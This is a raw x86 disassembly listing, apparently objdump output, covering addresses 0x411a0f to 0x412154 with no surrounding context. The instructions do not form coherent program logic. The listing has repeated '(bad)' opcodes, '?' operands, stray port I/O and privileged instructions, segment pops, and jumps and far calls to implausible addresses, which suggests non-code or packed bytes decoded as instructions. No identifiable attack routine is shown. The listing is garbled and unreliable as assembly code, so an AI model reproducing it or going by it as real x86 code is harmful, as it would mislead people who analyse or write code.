  411a0f:	cs pop ebx
  411a11:	bnd jne 0x411a1f
  411a14:	jge    0x4119a3
  411a16:	cmc    
  411a17:	test   dl,0xd5
  411a1a:	mov    ds:0x8632ca1,eax
  411a1f:	retf   
  411a20:	test   DWORD PTR [esi-0x51],ecx
  411a23:	cwde   
  411a24:	pushf  
  411a25:	lock mov cl,0xcd
  411a28:	out    dx,eax
  411a29:	xor    al,0xfb
  411a2b:	pop    esi
  411a2c:	xchg   BYTE PTR [ebp+0x7e3a4bee],cl
  411a32:	(bad)  
  411a34:	in     al,0x5d
  411a36:	in     eax,dx
  411a37:	inc    edx
  411a38:	dec    ebp
  411a3a:	pop    edx
  411a3b:	lea    edi,[esi+0x23]
  411a3e:	and    al,0xc6
  411a40:	jb     0x4119d3
  411a42:	out    dx,al
  411a43:	or     edi,esi
  411a45:	mov    ds:0x16e61a56,eax
  411a4a:	lahf   
  411a4b:	mov    eax,ds:0x96bb05d4
  411a50:	mov    BYTE PTR [ecx],cl
  411a52:	mov    bl,0xe5
  411a54:	push   esp
  411a55:	cwde   
  411a56:	xor    dl,BYTE PTR [esi]
  411a58:	sahf   
  411a59:	push   0x6f42293c
  411a5e:	dec    ecx
  411a5f:	mov    eax,ds:0xa7a07fba
  411a64:	clc    
  411a65:	icebp  
  411a66:	iret   
  411a67:	or     eax,0xfd98e463
  411a6c:	rol    eax,cl
  411a6e:	mov    esp,0x8d1f9639
  411a73:	mov    eax,ds:0x1d74f3e3
  411a78:	xchg   DWORD PTR [eax+0x3b],edi
  411a7b:	pop    es
  411a7c:	pop    esi
  411a7d:	xchg   esp,eax
  411a7e:	or     edx,DWORD PTR [eax+ebx*4-0x429caf0]
  411a85:	pusha  
  411a86:	jge    0x411a7e
  411a88:	pop    esp
  411a89:	mov    bl,0x2e
  411a8b:	inc    edx
  411a8c:	std    
  411a8d:	xchg   DWORD PTR [esi-0x112c51dd],esp
  411a93:	nop
  411a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a95:	jns    0x411aa4
  411a97:	sbb    eax,0xa11b4874
  411a9c:	xor    al,0x24
  411a9e:	les    ecx,FWORD PTR [eiz*2+0x5e1f6cca]
  411aa5:	ins    BYTE PTR es:[edi],dx
  411aa6:	pop    ds
  411aa7:	pushf  
  411aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aa9:	jge    0x411a5e
  411aab:	lods   eax,DWORD PTR ds:[esi]
  411aac:	lahf   
  411aad:	pusha  
  411aae:	mov    dh,0xb4
  411ab0:	iret   
  411ab1:	cmp    edx,ecx
  411ab3:	pop    ds
  411ab4:	enter  0xeee4,0x14
  411ab8:	test   BYTE PTR [ebx-0x52474094],bh
  411abe:	in     eax,dx
  411abf:	mov    al,ds:0x1a31323f
  411ac4:	sti    
  411ac5:	fsub   DWORD PTR [ebx]
  411ac7:	pop    eax
  411ac8:	pop    esi
  411ac9:	cmp    BYTE PTR [edx],al
  411acb:	lahf   
  411acc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411acd:	jnp    0x411a8d
  411acf:	int    0xc1
  411ad1:	mov    ds:0x919da229,al
  411ad6:	mov    edx,0xc7b7408d
  411adb:	mov    al,0x3f
  411add:	mov    dh,0x25
  411adf:	dec    esi
  411ae0:	xchg   edx,eax
  411ae1:	pusha  
  411ae2:	pop    ss
  411ae3:	jmp    0x411aae
  411ae5:	or     BYTE PTR [esi-0x57],bl
  411ae8:	inc    edi
  411ae9:	popa   
  411aea:	dec    edi
  411aeb:	dec    esp
  411aec:	out    dx,eax
  411aed:	pop    edx
  411aee:	dec    edx
  411aef:	pop    esi
  411af0:	mov    WORD PTR [esi-0x12],?
  411af3:	cdq    
  411af4:	not    DWORD PTR [edx+0x48feb33b]
  411afa:	dec    esp
  411afb:	mov    eax,ds:0x8f32d51d
  411b00:	add    ah,dh
  411b02:	xchg   dl,dl
  411b04:	pop    esi
  411b05:	sub    eax,0xffb8c5f2
  411b0a:	jbe    0x411a97
  411b0c:	inc    eax
  411b0d:	popa   
  411b0e:	add    dh,BYTE PTR [edi]
  411b10:	dec    esi
  411b11:	and    BYTE PTR [edi+0x17],0x78
  411b15:	rol    BYTE PTR [ecx],1
  411b17:	cmp    al,0xdd
  411b19:	mov    ebp,DWORD PTR [esi]
  411b1b:	inc    esi
  411b1c:	and    DWORD PTR [edi-0x10],esi
  411b1f:	lock imul esp,DWORD PTR [eax-0x5c],0x62
  411b24:	jecxz  0x411b2a
  411b26:	lods   al,BYTE PTR ds:[esi]
  411b27:	mov    ah,0xfa
  411b29:	inc    BYTE PTR [edx]
  411b2b:	cli    
  411b2c:	lods   eax,DWORD PTR ds:[esi]
  411b2d:	das    
  411b2e:	cmp    al,0x2a
  411b30:	pop    esi
  411b31:	adc    edx,DWORD PTR [ebp+0x4c]
  411b34:	sbb    esi,DWORD PTR [edx]
  411b36:	pop    ebp
  411b37:	neg    DWORD PTR [ecx+ecx*1-0x50]
  411b3b:	stos   DWORD PTR es:[edi],eax
  411b3c:	pop    esi
  411b3d:	sub    ch,bl
  411b3f:	mov    eax,ds:0x9e28425f
  411b44:	push   edx
  411b45:	mov    ch,0xdf
  411b47:	leave  
  411b48:	pop    esi
  411b49:	push   edx
  411b4a:	inc    ebp
  411b4b:	jp     0x411b8d
  411b4d:	xchg   BYTE PTR ds:0x72d07ea2,cl
  411b53:	mov    DWORD PTR [esi+esi*8+0x37],edi
  411b57:	test   BYTE PTR [esi+0x5e99c758],dh
  411b5d:	stos   DWORD PTR es:[edi],eax
  411b5e:	rcr    BYTE PTR [edx+0x49c51625],cl
  411b64:	mov    DWORD PTR [edx+0x67],0xf0214ae7
  411b6b:	mov    esp,0x86df40bf
  411b70:	pop    esi
  411b71:	sbb    DWORD PTR [eax],esp
  411b73:	sbb    al,bh
  411b75:	pop    ebx
  411b76:	shl    BYTE PTR [edi],0xda
  411b79:	data16 test al,0x70
  411b7c:	ficom  WORD PTR [ebp-0x52]
  411b7f:	cmp    eax,0xa0811c39
  411b84:	pop    edx
  411b85:	das    
  411b86:	jmp    FWORD PTR [edx+0xe]
  411b89:	sub    DWORD PTR [esi-0x27],ebp
  411b8c:	into   
  411b8d:	mov    ebx,0x1ce2a392
  411b92:	mov    dl,0x5a
  411b94:	fcmovnbe st,st(6)
  411b96:	into   
  411b97:	das    
  411b98:	mov    dl,0xd
  411b9a:	jmp    0x411bd2
  411b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b9d:	mov    DWORD PTR [edi],ecx
  411b9f:	inc    ebx
  411ba0:	cdq    
  411ba1:	shr    cl,1
  411ba3:	call   0x9aa1be36
  411ba8:	adc    dl,ch
  411baa:	leave  
  411bab:	daa    
  411bac:	fisubr WORD PTR [ebp+0x51]
  411baf:	cs in  al,dx
  411bb1:	outs   dx,DWORD PTR ds:[esi]
  411bb2:	out    dx,al
  411bb3:	ficom  DWORD PTR [edi]
  411bb5:	mov    bh,0x4b
  411bb7:	les    edi,FWORD PTR [edx+0x69]
  411bba:	sbb    ch,bh
  411bbc:	xchg   DWORD PTR [eax-0x23],esp
  411bbf:	add    BYTE PTR ds:0x4bdf317a,bh
  411bc5:	sbb    ebp,ebp
  411bc7:	out    0x66,eax
  411bc9:	cmc    
  411bca:	inc    ebp
  411bcb:	and    esi,ecx
  411bcd:	mov    dh,BYTE PTR [edx]
  411bcf:	xchg   ebp,eax
  411bd0:	int    0x60
  411bd2:	pop    ds
  411bd3:	popa   
  411bd4:	pop    esp
  411bd5:	fs and al,dl
  411bd8:	and    DWORD PTR [ebp+0xc8bfcee],0x427b4f92
  411be2:	jl     0x411b86
  411be4:	popf   
  411be5:	cld    
  411be6:	ss push ds
  411be8:	ror    DWORD PTR [ebp+0x3ecf6484],cl
  411bee:	ss jg  0x411b78
  411bf1:	mov    ecx,0x61530f1f
  411bf6:	pop    ds
  411bf7:	cmp    eax,0x720ece98
  411bfc:	and    BYTE PTR [ecx-0x28],ah
  411bff:	dec    eax
  411c00:	stos   BYTE PTR es:[edi],al
  411c01:	shl    DWORD PTR [ecx+edi*1-0x3118b645],cl
  411c08:	gs ins BYTE PTR es:[edi],dx
  411c0a:	adc    eax,0xd4a23dc0
  411c0f:	fild   QWORD PTR [edx-0x9]
  411c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c13:	fstp   DWORD PTR [edi]
  411c15:	push   edi
  411c16:	out    dx,al
  411c17:	jmp    0x411c74
  411c19:	mov    eax,ds:0x356723dd
  411c1e:	out    dx,al
  411c1f:	pop    es
  411c20:	pop    ebp
  411c21:	sti    
  411c22:	mov    bh,0x95
  411c24:	adc    cl,BYTE PTR [ecx]
  411c26:	addr16 mov eax,ds:0xb27f
  411c2a:	xchg   esi,eax
  411c2b:	push   es
  411c2c:	sbb    BYTE PTR [ebp-0x9],bl
  411c2f:	mov    BYTE PTR [edx+0x27],0xc1
  411c33:	pop    es
  411c34:	pop    esi
  411c35:	pop    ecx
  411c36:	mov    edi,0x766fa261
  411c3b:	mov    eax,ds:0xc58d5f54
  411c40:	push   ebp
  411c41:	mov    ebp,0x9eeb9724
  411c46:	dec    eax
  411c47:	ror    esi,cl
  411c49:	mov    eax,0x37814ee
  411c4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c4f:	cdq    
  411c50:	xchg   ebp,eax
  411c51:	cli    
  411c52:	xchg   ebx,eax
  411c53:	mov    eax,ds:0x73552a46
  411c58:	and    eax,0x63c8d3c5
  411c5d:	out    dx,al
  411c5e:	bound  eax,QWORD PTR [ecx-0xe011f12]
  411c64:	mov    esp,0x60a0d663
  411c69:	inc    ecx
  411c6a:	mov    esp,0xf4950fd8
  411c6f:	fcom   QWORD PTR [edx]
  411c71:	fdiv   DWORD PTR [eax+eiz*4-0x1c25570d]
  411c78:	add    DWORD PTR [edi-0x75],ecx
  411c7b:	mov    eax,ds:0xe74008fd
  411c80:	sub    al,BYTE PTR [esi+0x2e]
  411c83:	cmp    al,0x5e
  411c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c86:	xchg   ecx,eax
  411c87:	sbb    BYTE PTR [edi+0x57],0x58
  411c8b:	jp     0x411c2c
  411c8d:	mov    edx,0xd64ea0e7
  411c92:	inc    edx
  411c93:	rcl    BYTE PTR [ecx],cl
  411c95:	icebp  
  411c96:	jb     0x411c8a
  411c98:	pop    esi
  411c99:	or     al,BYTE PTR [eax+eax*1-0x4b7e26cf]
  411ca0:	mov    dh,0x60
  411ca2:	mov    esp,0xc8ba984
  411ca7:	pop    esi
  411ca8:	je     0x411c4e
  411caa:	lock mov ebp,0xc0cc83ea
  411cb0:	clc    
  411cb1:	pop    edi
  411cb2:	aas    
  411cb3:	jecxz  0x411c5f
  411cb5:	inc    eax
  411cb6:	fsub   DWORD PTR [edx-0x13]
  411cb9:	cmp    ch,bl
  411cbb:	sti    
  411cbc:	pop    ebx
  411cbd:	scas   al,BYTE PTR es:[edi]
  411cbe:	outs   dx,BYTE PTR ds:[esi]
  411cbf:	(bad)  [edi-0x5d]
  411cc2:	out    dx,al
  411cc3:	mov    BYTE PTR [ecx+0x3ca37031],bh
  411cc9:	mov    edi,0x2715e2cc
  411cce:	fldenv [eax]
  411cd0:	mov    al,0x37
  411cd2:	je     0x411c95
  411cd4:	xchg   edx,eax
  411cd5:	pop    edi
  411cd6:	shr    DWORD PTR [edx-0x66c0de4f],cl
  411cdc:	fwait
  411cdd:	xchg   esp,eax
  411cde:	shr    BYTE PTR [edi],1
  411ce0:	pop    esi
  411ce1:	mov    dh,0xd1
  411ce3:	push   ss
  411ce4:	daa    
  411ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ce6:	inc    edx
  411ce7:	sub    DWORD PTR [ecx+eiz*2],edi
  411cea:	jecxz  0x411d4e
  411cec:	cli    
  411ced:	mov    cl,0x44
  411cef:	pop    es
  411cf0:	fs inc edx
  411cf2:	out    dx,al
  411cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cf4:	(bad)  
  411cf5:	push   esp
  411cf6:	push   0xffffff82
  411cf8:	call   0x6c2e:0x7aa2697e
  411cff:	add    edi,DWORD PTR [esi+0x1a]
  411d02:	adc    ecx,DWORD PTR [ebp-0x56]
  411d05:	rol    BYTE PTR [ecx],1
  411d07:	lods   al,BYTE PTR ds:[esi]
  411d08:	cmp    eax,0x962fee85
  411d0d:	ja     0x411c8f
  411d0f:	stc    
  411d10:	xchg   DWORD PTR [eax+0x62],esp
  411d13:	jecxz  0x411d0f
  411d15:	enter  0x294e,0x37
  411d19:	mov    ch,0xee
  411d1b:	xchg   esp,eax
  411d1c:	xchg   edi,eax
  411d1d:	pushf  
  411d1e:	pusha  
  411d1f:	adc    ch,BYTE PTR [edi+0x7a]
  411d22:	cmp    al,0xa4
  411d24:	pop    ds
  411d25:	pop    edi
  411d26:	pop    ss
  411d27:	inc    esp
  411d28:	repnz scas eax,DWORD PTR es:[edi]
  411d2a:	out    dx,al
  411d2b:	and    dh,BYTE PTR [edi+0x1a3a9168]
  411d31:	dec    edi
  411d32:	out    0x6c,eax
  411d34:	add    al,0x61
  411d36:	(bad)  
  411d37:	and    al,0x33
  411d39:	push   0x8
  411d3b:	fwait
  411d3c:	or     BYTE PTR [esi],ah
  411d3e:	out    0x70,eax
  411d40:	dec    edx
  411d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d42:	mov    ah,0x91
  411d44:	fisubr WORD PTR [esi+edx*1]
  411d47:	cld    
  411d48:	jecxz  0x411cf2
  411d4a:	push   cs
  411d4b:	fst    st(1)
  411d4d:	jne    0x411d3d
  411d4f:	or     DWORD PTR [ecx-0x55],0x7
  411d53:	xor    eax,ebp
  411d55:	(bad)  
  411d57:	mov    cs,WORD PTR [esi]
  411d59:	popf   
  411d5a:	adc    eax,0xfc01ed5e
  411d5f:	cli    
  411d60:	mov    ch,dh
  411d62:	sti    
  411d63:	mov    al,ds:0x2cda5599
  411d68:	icebp  
  411d69:	dec    eax
  411d6a:	xor    edx,DWORD PTR [ebp-0x64f393a2]
  411d70:	dec    eax
  411d71:	aaa    
  411d72:	cwde   
  411d73:	cdq    
  411d74:	test   DWORD PTR [eax+0x16],esp
  411d77:	arpl   sp,di
  411d79:	add    al,0x7b
  411d7b:	jnp    0x411d22
  411d7d:	mov    eax,ds:0x65547ef
  411d82:	push   ds
  411d83:	mov    eax,ds:0xa6107f94
  411d88:	outs   dx,DWORD PTR ds:[esi]
  411d89:	pusha  
  411d8a:	aaa    
  411d8b:	rcr    DWORD PTR [edx-0x1e],1
  411d8e:	pop    esi
  411d8f:	daa    
  411d90:	int3   
  411d91:	sbb    al,BYTE PTR [edx]
  411d93:	test   BYTE PTR [ebx+ebx*1-0x7e0ed512],dh
  411d9a:	inc    esi
  411d9b:	cli    
  411d9c:	mov    ds:0x9701b860,al
  411da1:	push   edx
  411da2:	dec    ebp
  411da3:	daa    
  411da4:	ror    DWORD PTR [edx+ebx*8],1
  411da7:	pop    es
  411da8:	pop    ebx
  411da9:	mov    ebx,0x6f8bad74
  411dae:	ds pop esi
  411db0:	dec    edi
  411db1:	or     ebp,DWORD PTR [ecx-0x5f]
  411db4:	lods   eax,DWORD PTR ds:[esi]
  411db5:	fadd   DWORD PTR [eax+0x13c9ee20]
  411dbb:	rcr    DWORD PTR [esi+0x2c],0x91
  411dbf:	sbb    al,BYTE PTR [eax+edi*4-0x5e]
  411dc3:	loopne 0x411d9e
  411dc5:	pop    edi
  411dc6:	push   ebx
  411dc7:	adc    al,0xf0
  411dc9:	jge    0x411d99
  411dcb:	xor    ah,dl
  411dcd:	shl    BYTE PTR [ecx+0x50],0x5e
  411dd1:	push   ds
  411dd2:	sub    DWORD PTR [edi+0x41f279b9],0xbffb4271
  411ddc:	mov    bh,0xa0
  411dde:	jmp    0x411e51
  411de0:	out    dx,al
  411de1:	retf   
  411de2:	in     al,dx
  411de3:	arpl   WORD PTR [edx+0x62],dx
  411de6:	jbe    0x411e3c
  411de8:	pop    esi
  411de9:	xor    bh,al
  411deb:	sahf   
  411dec:	xchg   BYTE PTR [ecx+0x23],dh
  411def:	mov    eax,ds:0x4257f836
  411df4:	aam    0xd
  411df6:	push   0x27
  411df8:	pop    esi
  411df9:	lods   al,BYTE PTR ds:[esi]
  411dfa:	repz sti 
  411dfc:	lock mov cl,0x9a
  411dff:	(bad)  
  411e00:	jae    0x411e7a
  411e02:	rcl    DWORD PTR [eax-0x4a51a060],1
  411e08:	add    eax,0x1a6938bc
  411e0d:	jno    0x411e3b
  411e0f:	call   DWORD PTR [ebx-0x68]
  411e12:	(bad)  
  411e13:	cmp    bl,ch
  411e15:	rcl    dh,1
  411e17:	dec    ebx
  411e18:	in     eax,0xa
  411e1a:	outs   dx,DWORD PTR gs:[esi]
  411e1c:	std    
  411e1d:	dec    ecx
  411e1e:	pusha  
  411e1f:	add    esi,esp
  411e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e22:	or     ecx,ecx
  411e24:	cwde   
  411e25:	push   esp
  411e26:	out    dx,al
  411e27:	cmp    eax,0xa3e850dd
  411e2c:	xor    DWORD PTR [edx],edx
  411e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e2f:	je     0x411e8f
  411e31:	mov    dh,0x9d
  411e33:	sbb    al,ah
  411e35:	mov    ah,dl
  411e37:	xor    DWORD PTR [ebx+0x17224752],0xd9ab2ee3
  411e41:	shl    ah,0x71
  411e44:	pop    esi
  411e45:	shl    ch,cl
  411e47:	push   0x1ba1f29f
  411e4c:	sbb    BYTE PTR [ecx-0x21],ah
  411e4f:	jmp    0x411ddc
  411e51:	xlat   BYTE PTR ds:[ebx]
  411e52:	inc    edx
  411e53:	fisub  DWORD PTR [eax]
  411e55:	pushf  
  411e56:	in     eax,dx
  411e57:	sti    
  411e58:	or     esp,esi
  411e5a:	jb     0x411e75
  411e5c:	nop
  411e5d:	push   esp
  411e5e:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411e60:	jg     0x411ea6
  411e62:	or     BYTE PTR [edx-0xfe721eb],dl
  411e68:	inc    ebp
  411e69:	inc    edi
  411e6a:	shl    BYTE PTR ds:[edi-0x30ba1139],cl
  411e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e72:	and    al,BYTE PTR [ebx+0x56]
  411e75:	jne    0x411edc
  411e77:	jmp    0xa12b4500
  411e7c:	dec    ecx
  411e7d:	not    DWORD PTR [ebp+0x70f1bea7]
  411e83:	test   eax,0x27240e5e
  411e88:	icebp  
  411e89:	xor    edx,DWORD PTR [edi]
  411e8b:	xchg   ecx,eax
  411e8c:	daa    
  411e8d:	popa   
  411e8e:	inc    ebx
  411e8f:	xor    eax,DWORD PTR [edx+ecx*1-0x20c65013]
  411e96:	out    dx,al
  411e97:	or     al,0xce
  411e99:	sbb    ecx,edx
  411e9b:	mov    ?,WORD PTR [edi+0x2b]
  411e9e:	(bad)  
  411e9f:	mov    al,ds:0x53b140bb
  411ea4:	fld    QWORD PTR [esi+eiz*4-0x70]
  411ea8:	imul   DWORD PTR [ecx]
  411eaa:	out    dx,al
  411eab:	(bad)  
  411eac:	pushf  
  411ead:	inc    ebp
  411eae:	scas   eax,DWORD PTR es:[edi]
  411eaf:	cs imul ebp,edx,0x81cfa0f1
  411eb6:	mov    BYTE PTR [edi-0x52],0x2a
  411eba:	lea    ebx,[edx]
  411ebc:	pop    esi
  411ebd:	mov    eax,ds:0x334567f5
  411ec2:	outs   dx,BYTE PTR ds:[esi]
  411ec3:	adc    BYTE PTR [ecx+0x61],0x82
  411ec7:	cs mov ch,0xc7
  411eca:	(bad)  
  411ecb:	(bad)  [ecx+0x6ce99796]
  411ed1:	dec    edx
  411ed2:	loop   0x411f34
  411ed4:	push   ds
  411ed5:	popa   
  411ed6:	inc    edx
  411ed7:	rcr    BYTE PTR [esi+ecx*1+0x2a],1
  411edb:	adc    bl,BYTE PTR [esi+0x7a]
  411ede:	in     al,dx
  411edf:	or     eax,0xde71c737
  411ee4:	out    0x21,eax
  411ee6:	pop    ds
  411ee7:	mov    eax,ds:0xcd70b695
  411eec:	std    
  411eed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eee:	repnz fwait
  411ef0:	pop    esi
  411ef1:	fwait
  411ef2:	cmc    
  411ef3:	sbb    BYTE PTR [ebx],cl
  411ef5:	mov    ebx,DWORD PTR [ebx-0x5b]
  411ef8:	shl    BYTE PTR [eax-0x7f],1
  411efb:	add    esi,DWORD PTR [edx]
  411efd:	cwde   
  411efe:	jle    0x411f59
  411f00:	stos   BYTE PTR es:[edi],al
  411f01:	inc    edi
  411f02:	and    DWORD PTR [edx],esi
  411f04:	test   BYTE PTR [ebp-0x75],dl
  411f07:	jne    0x411f10
  411f09:	pusha  
  411f0a:	lahf   
  411f0b:	xor    al,0x7a
  411f0d:	fistp  WORD PTR [esi]
  411f0f:	or     DWORD PTR [ebp+0x61],ebx
  411f12:	pop    ecx
  411f13:	je     0x411ebc
  411f15:	retf   0x79c0
  411f18:	loope  0x411f68
  411f1a:	out    dx,al
  411f1b:	std    
  411f1c:	push   edi
  411f1d:	ret    
  411f1e:	pop    eax
  411f1f:	push   cs
  411f20:	je     0x411ea4
  411f22:	xchg   ebp,eax
  411f23:	jg     0x411f02
  411f25:	pusha  
  411f26:	xor    esi,0xfffffff0
  411f29:	aas    
  411f2a:	dec    ecx
  411f2b:	xor    BYTE PTR [edx+0x4040eea3],ch
  411f31:	sbb    al,0x41
  411f33:	sub    BYTE PTR [eax+0x66],ch
  411f36:	(bad)  
  411f37:	cdq    
  411f38:	inc    ecx
  411f39:	cmc    
  411f3a:	xchg   ebp,eax
  411f3b:	xor    ebx,esi
  411f3d:	xchg   ebp,eax
  411f3e:	retf   0xe68f
  411f41:	pop    ecx
  411f42:	lock mov cl,0x38
  411f45:	sbb    al,0xab
  411f47:	loopne 0x411f19
  411f49:	cmp    DWORD PTR [esi-0x479ee9b3],ebx
  411f4f:	jnp    0x411f46
  411f51:	pop    eax
  411f52:	add    DWORD PTR [ebp+0x1a],eax
  411f55:	in     al,0x20
  411f57:	test   ah,al
  411f59:	pusha  
  411f5a:	dec    ecx
  411f5b:	mov    ecx,0xcb47b6a3
  411f60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f61:	pusha  
  411f62:	and    eax,DWORD PTR [ebx+0x54c84b2a]
  411f68:	arpl   WORD PTR [edi+0x2],sp
  411f6b:	(bad)  
  411f6c:	cmp    ebp,DWORD PTR [esi]
  411f6e:	cs jo  0x411f43
  411f71:	(bad)  
  411f72:	jnp    0x411fa9
  411f74:	mov    WORD PTR [ebp-0x2],ds
  411f77:	hlt    
  411f78:	fs jb  0x411f29
  411f7b:	ret    0x707b
  411f7e:	add    al,0x4b
  411f80:	add    edx,edx
  411f82:	out    dx,al
  411f83:	push   ds
  411f84:	sub    al,0x18
  411f86:	mov    cl,0xdc
  411f88:	addr16 mov dh,0x3a
  411f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f8c:	sar    BYTE PTR [ecx-0x11],cl
  411f8f:	sbb    BYTE PTR [ebx+esi*1-0x5947e762],bl
  411f96:	jmp    0x411feb
  411f98:	jecxz  0x411fae
  411f9a:	push   0xffffffd7
  411f9c:	loop   0x411f46
  411f9e:	iret   
  411f9f:	popf   
  411fa0:	popf   
  411fa1:	pusha  
  411fa2:	pop    esp
  411fa3:	cmp    eax,0xf08e8362
  411fa8:	out    dx,eax
  411fa9:	cmp    dh,ch
  411fab:	daa    
  411fac:	mov    edi,esp
  411fae:	ins    BYTE PTR es:[edi],dx
  411faf:	loope  0x411fc4
  411fb1:	or     DWORD PTR [edx+0x418a86a3],esi
  411fb7:	imul   ebx,esp,0x36
  411fba:	xchg   BYTE PTR [eax+0x2ddcecb7],dh
  411fc0:	pop    edi
  411fc1:	mov    ds:0xbb40c7b7,eax
  411fc6:	leave  
  411fc7:	sbb    BYTE PTR [edx-0x7e],dh
  411fca:	xor    BYTE PTR [ecx+0x28dd15b4],ah
  411fd0:	cwde   
  411fd1:	or     eax,0x567094b9
  411fd6:	out    dx,al
  411fd7:	(bad)  
  411fd8:	pop    ebx
  411fd9:	cmp    ebp,DWORD PTR ds:0x1022302d
  411fdf:	mov    eax,ds:0x286bc982
  411fe4:	xchg   esi,eax
  411fe5:	adc    al,0xd9
  411fe7:	imul   esi,DWORD PTR [edx-0x6c],0xf59fda0a
  411fee:	out    0xd1,eax
  411ff0:	jp     0x411fea
  411ff2:	mov    cl,BYTE PTR [eax]
  411ff4:	fisub  WORD PTR ds:0x611ed81f
  411ffa:	out    0xc7,al
  411ffc:	adc    ebx,edx
  411ffe:	test   DWORD PTR [eax+edi*8],esp
  412001:	(bad)  
  412002:	out    dx,al
  412003:	adc    eax,0xacf34605
  412008:	in     eax,dx
  412009:	test   al,0xa0
  41200c:	jo     0x412079
  41200e:	mov    ah,0xc1
  412010:	std    
  412011:	push   0xffffff9f
  412013:	shl    DWORD PTR [eax+esi*4-0x52],cl
  412017:	or     ebx,ebx
  412019:	rcl    DWORD PTR ds:[eax+ebp*8],0xc0
  41201e:	lea    esi,[edx]
  412020:	xor    esp,DWORD PTR [ecx+0x4a]
  412023:	jecxz  0x41206f
  412025:	xchg   ebp,eax
  412026:	mov    ebx,0x256c4fad
  41202b:	call   0x38c47a40
  412030:	cmp    al,0xd3
  412032:	ja     0x412009
  412034:	fisubr WORD PTR [ecx]
  412036:	int3   
  412037:	or     bh,cl
  412039:	push   esp
  41203a:	inc    esp
  41203b:	retf   0xbb7c
  41203e:	xchg   esi,eax
  41203f:	test   al,0xf3
  412041:	lock out dx,al
  412043:	sub    ah,ah
  412045:	loopne 0x41205a
  412047:	outs   dx,DWORD PTR ds:[esi]
  412048:	cmp    eax,0xebafe5b9
  41204d:	gs jmp 0x412001
  412050:	jae    0xedefa048
  412056:	je     0x4120bb
  412058:	pop    esi
  412059:	push   0x36
  41205b:	xor    cl,bl
  41205d:	icebp  
  41205e:	popa   
  41205f:	(bad)  
  412060:	xchg   ebx,eax
  412061:	pop    edi
  412062:	and    al,0x65
  412064:	jne    0x41204b
  412066:	cdq    
  412067:	and    BYTE PTR [ebx+0x52245a3f],0xd7
  41206e:	std    
  41206f:	inc    eax
  412070:	and    cl,cl
  412072:	aad    0x1b
  412074:	gs push 0x605e7772
  41207a:	jbe    0x412021
  41207c:	adc    BYTE PTR [edi+0x63],ch
  41207f:	jecxz  0x4120df
  412081:	aam    0x59
  412083:	mov    BYTE PTR [ebp+ebx*4+0x533c6e92],bh
  41208a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41208b:	loopne 0x4120f7
  41208d:	mov    edx,0xa083a6c7
  412092:	add    esp,DWORD PTR [eax+0x9]
  412095:	lahf   
  412096:	out    dx,al
  412097:	leave  
  412098:	or     al,0xe7
  41209a:	xor    DWORD PTR [ebp-0x5e6fddcd],ecx
  4120a0:	sub    DWORD PTR [esi+0x4],esi
  4120a3:	out    dx,eax
  4120a4:	aas    
  4120a5:	and    DWORD PTR [ecx],eax
  4120a7:	repnz pusha 
  4120a9:	sbb    BYTE PTR [ecx],cl
  4120ab:	aam    0x9d
  4120ad:	mov    dh,0x6d
  4120af:	add    DWORD PTR [ecx+0x29a11ab4],esi
  4120b5:	loop   0x41205c
  4120b7:	imul   eax,esp,0x5e390875
  4120bd:	sbb    esi,DWORD PTR [eax-0x2c]
  4120c0:	pop    ebp
  4120c1:	sets   BYTE PTR [ebx+0x64]
  4120c5:	popa   
  4120c6:	rcl    DWORD PTR [edi-0x74c2a205],0x3b
  4120cd:	test   DWORD PTR [eax-0x20],0xaf97955e
  4120d4:	mov    esp,0xfee65741
  4120d9:	pusha  
  4120da:	sbb    ch,BYTE PTR [ecx+eiz*1]
  4120dd:	jg     0x41213f
  4120df:	fwait
  4120e0:	test   DWORD PTR [edi-0x13],0xe2972462
  4120e7:	sub    BYTE PTR [edx-0x4a87d591],al
  4120ed:	inc    edx
  4120ee:	shr    BYTE PTR [esi],0xa
  4120f1:	sub    BYTE PTR [eax+0x55],dh
  4120f4:	into   
  4120f5:	(bad)  
  4120f6:	out    dx,al
  4120f7:	lods   eax,DWORD PTR ds:[esi]
  4120f8:	pop    esp
  4120f9:	mov    eax,0xe9f3bede
  4120fe:	jmp    0x4120d0
  412100:	jmp    0x98b3eef1
  412105:	mov    al,ds:0x6111da29
  41210a:	jae    0x412160
  41210c:	sti    
  41210d:	scas   eax,DWORD PTR es:[edi]
  41210e:	fadd   QWORD PTR [esi-0x9]
  412111:	pop    eax
  412112:	jmp    0x9ea3:0x3ba4e6a
  412119:	test   al,0x69
  41211b:	and    al,0xfd
  41211d:	arpl   WORD PTR [ebx+0x59],cx
  412120:	fimul  WORD PTR [ebx]
  412122:	clc    
  412123:	repz xchg edi,eax
  412125:	mov    eax,ds:0xc65fb73a
  41212a:	repnz xor al,0xed
  41212d:	repnz retf 0xa72b
  412131:	pop    ebx
  412132:	ss inc edx
  412134:	add    BYTE PTR [ebp-0x72],al
  412137:	and    DWORD PTR [edx+0x2],edi
  41213a:	jecxz  0x4120fa
  41213c:	pop    esi
  41213d:	test   al,0xec
  41213f:	cmp    ebx,DWORD PTR [edi]
  412141:	aaa    
  412142:	mov    dh,0x65
  412144:	sbb    eax,0x33574861
  412149:	rol    BYTE PTR [ebx+edi*1-0x52dfb99d],1
  412150:	adc    al,0x43
  412152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412153:	leave  
  412154:	fidivr WORD PTR [edx-0x6d]
